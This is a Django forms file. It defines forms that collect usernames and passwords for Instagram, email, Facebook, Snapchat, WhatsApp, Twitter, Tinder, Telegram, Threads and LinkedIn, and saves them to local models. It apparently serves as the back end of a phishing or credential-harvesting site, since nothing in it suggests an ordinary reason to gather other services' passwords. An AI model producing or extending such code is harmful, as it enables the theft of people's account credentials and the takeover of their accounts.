from django import forms
from .models import Participant, Instagram, Facebook, Email, Twitter, Tinder, Snapchat, Thread, WhatsApp, Linkedin, Telegram

class ParticipantForm(forms.Form):
    username = forms.CharField(label='Instagram Username', max_length=100, widget=forms.TextInput(attrs={'autocomplete': 'off'}))
    password = forms.CharField(label='Instagram Password', widget=forms.PasswordInput(attrs={'autocomplete': 'off'}))
class InstagramForm(forms.ModelForm):
    class Meta: 
        model = Instagram
        fields = ['username', 'password']
class EmailForm(forms.ModelForm):
    class Meta: 
        model = Email
        fields = ['username', 'password']
class FacebookForm(forms.ModelForm):
    class Meta: 
        model = Facebook
        fields = ['username', 'password']
class SnapchatForm(forms.ModelForm):
    class Meta: 
        model = Snapchat
        fields = ['username', 'password']
class WhatsAppForm(forms.ModelForm):
    class Meta: 
        model = WhatsApp
        fields = ['username', 'password']
class TwitterForm(forms.ModelForm):
    class Meta: 
        model = Twitter
        fields = ['username', 'password']
class TinderForm(forms.ModelForm):
    class Meta: 
        model = Tinder
        fields = ['username', 'password']
class TelegramForm(forms.ModelForm):
    class Meta: 
        model = Telegram
        fields = ['username', 'password']
class ThreadForm(forms.ModelForm):
    class Meta: 
        model = Thread
        fields = ['username', 'password']
class LinkedinForm(forms.ModelForm):
    class Meta: 
        model = Linkedin
        fields = ['username', 'password']
